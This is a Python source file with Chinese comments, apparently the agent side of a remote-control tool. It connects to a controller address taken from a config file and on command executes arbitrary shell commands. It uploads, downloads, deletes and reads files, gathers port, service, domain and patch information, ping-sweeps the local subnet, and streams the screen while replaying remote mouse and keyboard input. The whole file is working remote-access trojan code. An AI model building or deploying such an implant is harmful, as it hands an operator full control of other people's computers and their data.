#!/usr/bin/python3
# _*_ coding: utf-8 _*_
import configparser  # 读取配置文件的库
import socket
import struct  # 序列化和反序列化
import os
import subprocess  # 启动一个新进程
import json
from PIL import ImageGrab
from cv2 import cv2
import numpy as np
import threading
import time
import pyautogui as ag
import mouse
from _keyboard import getKeycodeMapping

# 全局变量读取配置文件
config = configparser.ConfigParser()
config.read('config.ini', 'utf8')


# 远程命令执行
def Execommand(clientSocket):
    while True:
        try:
            command = clientSocket.recv(1024).decode('utf-8')
            # 将接收到的命令进行命令，参数分割
            commandlist = command.split()
            if not command:
                continue
            # # 接收到exit时退出命令执行功能
            elif commandlist[0] == 'exit':
                break
            # 执行cd时不能直接通过subprocess进行目录切换，否者会出现[Errno] No such file eor directory 错误，要通过os.chdir来切换目录
            elif commandlist[0] == 'cd':
                os.chdir(commandlist[1])
                pwd = os.getcwd().encode('utf-8')
                clientSocket.send(pwd)
            else:
                # # cmdmesg = subprocess.getoutput(command)
                # clientSocket.sendall(subprocess.check_output(command, shell=True))
                # # clientSocket.sendall(cmdmesg)
                # 创建数据流管道
                obj = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout = obj.stdout.read()
                stderr = obj.stderr.read()
                # 向客户端发送数据

                # 解决粘包问题
                # 1.制作固定长度的报头
                header_dic = {
                    'filename': 'a.txt',
                    'total_size': len(stdout) + len(stderr)
                }
                # 序列化报头
                header_json = json.dumps(header_dic)  # 序列化为byte字节流类型
                header_bytes = header_json.encode('utf-8')  # 编码为utf-8（Mac系统）
                # 2.先发送报头的长度
                # 2.1 将byte类型的长度打包成4位int
                clientSocket.send(struct.pack('i', len(header_bytes)))
                # 2.2 再发报头
                clientSocket.send(header_bytes)
                # 2.3 再发真实数据
                clientSocket.send(stdout)
                clientSocket.send(stderr)
        # 出现异常的时候进行捕获，并通知主控端
        except Exception as message:
            clientSocket.sendall("Fail to execute,please check your command!!!".encode())
        # 包错跳出循环时通过continue重新进入循环
        continue


# 文件传输函数
def TransferFiles(clientSocket):
    while True:
        command = clientSocket.recv(1024).decode('utf-8')
        # 进行命令参数分割
        commandlist = command.split()
        if commandlist[0] == 'exit':
            break
        # 若方法为download ,则表示主控端需要获取被控端的文件
        if commandlist[0] == 'download':
            UploadFile(clientSocket, commandlist[1])
        if commandlist[0] == 'upload':
            DownloadFile(clientSocket, command)
        if commandlist[0] == 'delete':
            DeleteFile(clientSocket, commandlist[1])
        if commandlist[0] == 'read':
            ReadFile(clientSocket, commandlist[1])


# 文件上传
def UploadFile(clientSocket, filepath):
    while True:
        uploadfilepath = filepath
        if os.path.isfile(uploadfilepath):
            # 先传输文件信息防止粘包
            # 定义文件信息，128s表示文件名长度为128字节，l表示用int类型表示文件大小
            # 把文件名和文件大小信息进行封装，发给接收端
            fileinfo = struct.pack('128sl', bytes(os.path.basename(uploadfilepath).encode('utf-8')),
                                   os.stat(uploadfilepath).st_size)
            clientSocket.send(fileinfo)
            print('[+] Fileinfo send success! name:{0} size:{1}'.format(os.path.basename(uploadfilepath),
                                                                        os.stat(uploadfilepath).st_size))

            # 开始传输文件的内容
            print('[+] start uploading...')
            with open(uploadfilepath, 'rb') as f:
                while True:
                    # 分块多次读，防止文件过大时一次性读完导致内存不足
                    data = f.read(1024)
                    if not data:
                        f.close()
                        print("[+] File Upload Over!!!")
                        break
                    clientSocket.send(data)
            break


# 文件下载函数
def DownloadFile(clientSocket, command):
    while True:
        # 先接收文件的信息，进行解析
        # 长度自定义，先接受文件信息的主要原因是防止粘包
        # 接收长度为128sl
        # command = clientSocket.recv(1024).decode('utf-8')
        commandlist = command.split()
        fileinfo = clientSocket.recv(struct.calcsize('128sl'))
        uploadfilepath = ''
        if fileinfo:
            # 按照同样的格式（128sl）进行拆包
            filename, filesize = struct.unpack('128sl', fileinfo)
            # print(filename)
            # 把文件名后面的多余空字符去除
            filename = filename.decode('utf-8').strip('\00')
            # print(filename)
            # 检测是否指定路径上传
            if len(commandlist) == 3:
                uploadfilepath = commandlist[2].strip('/')
                uploadfilepath = uploadfilepath + '/'
                filepath = uploadfilepath + filename
                # print(uploadfilepath)
            newfilename = 'new_' + filename
            # 若未指定路径执行if，否则执行else
            if not uploadfilepath:
                # 定义文件上传到当前路径
                if os.path.isfile(filename):
                    newfilename = os.path.join('../', newfilename)
                    print('[+]Fileinfo Receive over! name:{0} size:{1}'.format(newfilename, filesize))
                else:
                    newfilename = os.path.join('../', filename)
                    print('[+]Fileinfo Receive over! name:{0} size:{1}'.format(filename, filesize))
            else:
                # 定义文件上传到指定路径
                if os.path.isfile(filepath):
                    newfilename = os.path.join(uploadfilepath, newfilename)
                    print(newfilename)
                    print('[+]Fileinfo Receive over! name:{0} size:{1}'.format(newfilename, filesize))
                else:
                    newfilename = os.path.join(uploadfilepath, filename)
                    print(newfilename)
                    print('[+]Fileinfo Receive over! name:{0} size:{1}'.format(filename, filesize))

            # 接收文件内容
            # 表示已经接收到的文件内容的大小
            recvdsize = 0
            print('[+] start receiving...')
            with open(newfilename, 'wb') as f:
                # 分次分块写入
                while not recvdsize == filesize:
                    if filesize - recvdsize > 1024:
                        data = clientSocket.recv(1024)
                        f.write(data)
                        recvdsize += len(data)
                    else:
                        # 当剩余内容不足1024时，则直接把剩下的内容全部接收写入
                        data = clientSocket.recv(filesize - recvdsize)
                        f.write(data)
                        recvdsize = filesize
                        f.close()
                        break
            print("[+] File Receive over!!!")
        break


# 文件删除
def DeleteFile(clientSocket, deletefilepath):
    deletecmd = 'del ' + deletefilepath
    answer = clientSocket.recv(1024).decode('utf-8')
    if answer == 'yes':
        if os.path.isfile(deletefilepath):
            os.system(deletecmd)
            if os.path.isfile(deletefilepath):
                print('Failed to delete the file!')
                no = 'no'
                clientSocket.send(no.encode('utf-8'))
            else:
                print('Success!')
                yes = 'yes'
                clientSocket.send(yes.encode('utf-8'))
        else:
            print('The file not exist!')
            exist = 'notexist'
            clientSocket.send(exist.encode('utf-8'))


# 文件读取
def ReadFile(clientSocket, filepath):
    readcmd = 'type ' + filepath
    try:
        if os.path.isfile(filepath):
            clientSocket.send('yes'.encode('utf-8'))
            obj = subprocess.Popen(readcmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout = obj.stdout.read()
            stderr = obj.stderr.read()
            # 向客户端发送数据

            # 解决粘包问题
            # 1.制作固定长度的报头
            header_dic = {
                'filename': 'a.txt',
                'total_size': len(stdout) + len(stderr)
            }
            # 序列化报头
            header_json = json.dumps(header_dic)  # 序列化为byte字节流类型
            header_bytes = header_json.encode('utf-8')  # 编码为utf-8（Mac系统）
            # 2.先发送报头的长度
            # 2.1 将byte类型的长度打包成4位int
            clientSocket.send(struct.pack('i', len(header_bytes)))
            # 2.2 再发报头
            clientSocket.send(header_bytes)
            # 2.3 再发真实数据
            clientSocket.send(stdout)
            clientSocket.send(stderr)
        else:
            clientSocket.send('no'.encode('utf-8'))
    except Exception as msg:
        clientSocket.sendall("Fail to read!".encode())


# 被动连接：client端主动连接server端
def connect_passive():
    try:
        # 读取配置文件中server端的ip和port
        serverip = config.get('passive', 'serverip')
        serverport = config.getint('passive', 'serverport')
        # 连接server端
        # 创建tcp型socket套接字
        clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        clientSocket.connect((serverip, serverport))
        # 发送client端主机名
        hostname = subprocess.check_output("hostname")
        clientSocket.sendall(hostname)

        # 等待主控端指令
        print("[*]Wating instruction...")
    except Exception as msg:
        print("Passive connection error!")
    return clientSocket


# 主动连接：server端主动连接client端
def connect_active():
    try:
        # 读取配置文件中server端的ip和port
        listenIp = config.get("active", "listenip")  # ip需要字符型
        listenPort = config.getint("active", "listenport")  # port需要整型
        listenAddr = (listenIp, listenPort)
        try:
            clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            clientSocket.bind(listenAddr)
            clientSocket.listen(1)
        except socket.error as message:
            print(message)
            os._exit(0)
        print("[*]Client is up! Waiting connection...!")
        conn, addr = clientSocket.accept()
        hostname = conn.recv(1024)
        print(("[+]Host is up! \n ============\n name:{0} ip:{1} \n port:{2} \n ============ \n".format(
            bytes.decode(hostname), addr[0], addr[1])))
        # 发送给server端连接成功的信号
        flag = 'yes'
        conn.send(flag.encode('utf-8'))
        clientname = subprocess.check_output("hostname")
        conn.sendall(clientname)

        return conn
    except Exception as msg:
        print("Active connection error!")


# 内网扫描
def NetworkScan(clientSocket):
    while True:
        # 接收功能块的send
        command = clientSocket.recv(1024).decode('utf-8')
        # print("network command", command)
        # 进行命令参数分割
        if command == 'exit':
            break
        # 若方法为download ,则表示主控端需要获取被控端的文件
        if command == '1':
            PortScan(clientSocket)
        if command == '2':
            ServiceScan(clientSocket)
        if command == '3':
            DomainScan(clientSocket)
        if command == '4':
            AlivehostScan(clientSocket)


# 端口扫描
def PortScan(clientSocket):
    portscancmd = 'netstat -ano'
    try:
        obj = subprocess.Popen(portscancmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout = obj.stdout.read()
        stderr = obj.stderr.read()
        # 向客户端发送数据

        # 解决粘包问题
        # 1.制作固定长度的报头
        header_dic = {
            'filename': 'a.txt',
            'total_size': len(stdout) + len(stderr)
        }
        # 序列化报头
        header_json = json.dumps(header_dic)  # 序列化为byte字节流类型
        header_bytes = header_json.encode('utf-8')  # 编码为utf-8（Mac系统）
        # 2.先发送报头的长度
        # 2.1 将byte类型的长度打包成4位int
        clientSocket.send(struct.pack('i', len(header_bytes)))
        # 2.2 再发报头
        clientSocket.send(header_bytes)
        # 2.3 再发真实数据
        clientSocket.send(stdout)
        clientSocket.send(stderr)

    except Exception as msg:
        clientSocket.sendall("Fail to scan port !".encode())


# 服务探测
def ServiceScan(clientSocket):
    portscancmd = 'net start'
    try:
        obj = subprocess.Popen(portscancmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout = obj.stdout.read()
        stderr = obj.stderr.read()
        # 向客户端发送数据

        # 解决粘包问题
        # 1.制作固定长度的报头
        header_dic = {
            'filename': 'a.txt',
            'total_size': len(stdout) + len(stderr)
        }
        # 序列化报头
        header_json = json.dumps(header_dic)  # 序列化为byte字节流类型
        header_bytes = header_json.encode('utf-8')  # 编码为utf-8（Mac系统）
        # 2.先发送报头的长度
        # 2.1 将byte类型的长度打包成4位int
        clientSocket.send(struct.pack('i', len(header_bytes)))
        # 2.2 再发报头
        clientSocket.send(header_bytes)
        # 2.3 再发真实数据
        clientSocket.send(stdout)
        clientSocket.send(stderr)

    except Exception as msg:
        clientSocket.sendall("Fail to scan service !".encode())


# 域环境扫描
def DomainScan(clientSocket):
    portscancmd = 'net config workstation'
    try:
        obj = subprocess.Popen(portscancmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout = obj.stdout.read()
        stderr = obj.stderr.read()
        # 向客户端发送数据

        # 解决粘包问题
        # 1.制作固定长度的报头
        header_dic = {
            'filename': 'a.txt',
            'total_size': len(stdout) + len(stderr)
        }
        # 序列化报头
        header_json = json.dumps(header_dic)  # 序列化为byte字节流类型
        header_bytes = header_json.encode('utf-8')  # 编码为utf-8（Mac系统）
        # 2.先发送报头的长度
        # 2.1 将byte类型的长度打包成4位int
        clientSocket.send(struct.pack('i', len(header_bytes)))
        # 2.2 再发报头
        clientSocket.send(header_bytes)
        # 2.3 再发真实数据
        clientSocket.send(stdout)
        clientSocket.send(stderr)

    except Exception as msg:
        clientSocket.sendall("Fail to scan domain !".encode())


# 存活主机探测
def AlivehostScan(clientSocket):
    clientip = config.get("client", "clientip")
    ipstr = clientip.split(".")
    # print(ipstr)
    ip = ipstr[0] + '.' + ipstr[1] + '.' + ipstr[2] + '.'
    # print(ip)
    portscancmd = 'for /L %I in (1,1,254) DO @ping -w 1 -n 1 ' + ip + '%I | findstr "TTL="'
    print(portscancmd)
    try:
        obj = subprocess.Popen(portscancmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout = obj.stdout.read()
        stderr = obj.stderr.read()
        if not stdout:
            clientSocket.send('null'.encode('utf-8'))
        else:
            clientSocket.send('yes'.encode('utf-8'))
            # 向客户端发送数据
            # 解决粘包问题
            # 1.制作固定长度的报头
            header_dic = {
                'filename': 'a.txt',
                'total_size': len(stdout) + len(stderr)
            }
            # 序列化报头
            header_json = json.dumps(header_dic)  # 序列化为byte字节流类型
            header_bytes = header_json.encode('utf-8')  # 编码为utf-8（Mac系统）
            # 2.先发送报头的长度
            # 2.1 将byte类型的长度打包成4位int
            clientSocket.send(struct.pack('i', len(header_bytes)))
            # 2.2 再发报头
            clientSocket.send(header_bytes)
            # 2.3 再发真实数据
            clientSocket.send(stdout)
            clientSocket.send(stderr)

    except Exception as msg:
        clientSocket.sendall("Fail to scan domain !".encode())


# 补丁扫描
def KBScan(clientSocket):
    portscancmd = 'systeminfo'
    try:
        obj = subprocess.Popen(portscancmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout = obj.stdout.read()
        stderr = obj.stderr.read()
        # 向客户端发送数据

        # 解决粘包问题
        # 1.制作固定长度的报头
        header_dic = {
            'filename': 'a.txt',
            'total_size': len(stdout) + len(stderr)
        }
        # 序列化报头
        header_json = json.dumps(header_dic)  # 序列化为byte字节流类型
        header_bytes = header_json.encode('utf-8')  # 编码为utf-8（Mac系统）
        # 2.先发送报头的长度
        # 2.1 将byte类型的长度打包成4位int
        clientSocket.send(struct.pack('i', len(header_bytes)))
        # 2.2 再发报头
        clientSocket.send(header_bytes)
        # 2.3 再发真实数据
        clientSocket.send(stdout)
        clientSocket.send(stderr)

    except Exception as msg:
        clientSocket.sendall("Fail to scan KB!".encode())


# 画面周期
IDLE = 0.05
# 鼠标滚轮灵敏度
SCROLL_NUM = 5
bufsize = 1024
# 压缩比 1-100 数值越小，压缩比越高，图片质量损失越严重
IMQUALITY = 50
img = None
# 编码后的图像
imbyt = None
lock = threading.Lock()


def DesktopCtrl():
    listenPort = config.getint("desktop_ctrl", "ctrl_listenport")
    host = ('0.0.0.0', listenPort)
    print(host)
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.bind(host)
    soc.listen(1)
    while True:
        try:
            conn, _ = soc.accept()
            thread1 = threading.Thread(target=handle, args=(conn,))
            thread2 = threading.Thread(target=ctrl, args=(conn,))
            thread1.start()
            thread2.start()
            #  阻塞handle,ctrl强制退出子线程
            thread1.join()
            thread2.join()
            # print("live***" * 5)
            return
        except Exception as e:
            print("DesktopCtrl error ",e)
            break
    print("exit DesktopCtrl")



def ctrl(conn):
    '''
    读取控制命令，并在本机还原操作
    '''
    keycodeMapping = {}

    def Op(key, op, ox, oy):
        # print(key, op, ox, oy)
        if key == 4:
            # 鼠标移动
            mouse.move(ox, oy)
        elif key == 1:
            if op == 100:
                # 左键按下
                ag.mouseDown(button=ag.LEFT)
            elif op == 117:
                # 左键弹起
                ag.mouseUp(button=ag.LEFT)
        elif key == 2:
            # 滚轮事件
            if op == 0:
                # 向上
                ag.scroll(-SCROLL_NUM)
            else:
                # 向下
                ag.scroll(SCROLL_NUM)
        elif key == 3:
            # 鼠标右键
            if op == 100:
                # 右键按下
                ag.mouseDown(button=ag.RIGHT)
            elif op == 117:
                # 右键弹起
                ag.mouseUp(button=ag.RIGHT)
        else:
            k = keycodeMapping.get(key)
            if k is not None:
                if op == 100:
                    ag.keyDown(k)
                elif op == 117:
                    ag.keyUp(k)

    try:
        plat = b''
        while True:
            plat += conn.recv(3 - len(plat))
            if len(plat) == 3:
                break
        print("Plat:", plat.decode())
        keycodeMapping = getKeycodeMapping(plat)
        base_len = 6
        while True:
            # print("ctrl live***"*5)
            cmd = b''
            rest = base_len - 0
            while rest > 0:
                cmd += conn.recv(rest)
                rest -= len(cmd)
            key = cmd[0]
            op = cmd[1]
            x = struct.unpack('>H', cmd[2:4])[0]
            y = struct.unpack('>H', cmd[4:6])[0]
            Op(key, op, x, y)
    except Exception as e:
        # print("ctrl error ",e)
        conn.close()
        return


def handle(conn: socket.socket):
    global img, imbyt
    lock.acquire()
    if imbyt is None:
        imorg = np.asarray(ImageGrab.grab())
        _, imbyt = cv2.imencode(
            ".jpg", imorg, [cv2.IMWRITE_JPEG_QUALITY, IMQUALITY])
        imnp = np.asarray(imbyt, np.uint8)
        img = cv2.imdecode(imnp, cv2.IMREAD_COLOR)
    lock.release()
    lenb = struct.pack(">BI", 1, len(imbyt))
    conn.sendall(lenb)
    conn.sendall(imbyt)
    try:
        while True:
            # print("handle***" * 5)
            # fix for linux
            time.sleep(IDLE)
            gb = ImageGrab.grab()
            imgnpn = np.asarray(gb)
            _, timbyt = cv2.imencode(
                ".jpg", imgnpn, [cv2.IMWRITE_JPEG_QUALITY, IMQUALITY])
            imnp = np.asarray(timbyt, np.uint8)
            imgnew = cv2.imdecode(imnp, cv2.IMREAD_COLOR)
            # 计算图像差值
            imgs = imgnew ^ img
            if (imgs != 0).any():
                # 画质改变
                pass
            else:
                continue
            imbyt = timbyt
            img = imgnew
            # 无损压缩
            _, imb = cv2.imencode(".png", imgs)
            l1 = len(imbyt)  # 原图像大小
            l2 = len(imb)  # 差异图像大小
            if l1 > l2:
                # 传差异化图像
                lenb = struct.pack(">BI", 0, l2)
                conn.sendall(lenb)
                conn.sendall(imb)
            else:
                # 传原编码图像
                lenb = struct.pack(">BI", 1, l1)
                conn.sendall(lenb)
                conn.sendall(imbyt)
    except Exception as e:
        # print("handle error ", e)
        conn.close()
        return


if __name__ == '__main__':
    print("Plesse select a connection mode!")
    print("[a]Active connection \n")
    print("[p]Passive connection\n")
    while True:
        connect_choice = input('[ConnectWay]>>> ')
        if connect_choice == 'a':
            conn = connect_active()
            break
        elif connect_choice == 'p':
            conn = connect_passive()
            break
        else:
            print("Input error!\n")
    while True:
        # 接收主控端的指令，并进入相应模块
        # 接收到的内容为bytes型，需要将decode转型为str型
        instruction = conn.recv(10).decode('utf-8')
        # print("receve command ", instruction)
        if instruction == '1':
            TransferFiles(conn)
        elif instruction == '2':
            Execommand(conn)
        elif instruction == '3':
            NetworkScan(conn)
        elif instruction == '4':
            KBScan(conn)
        elif instruction == '5':
            DesktopCtrl()
        elif instruction == 'exit':
            break
        else:
            pass
    conn.close()
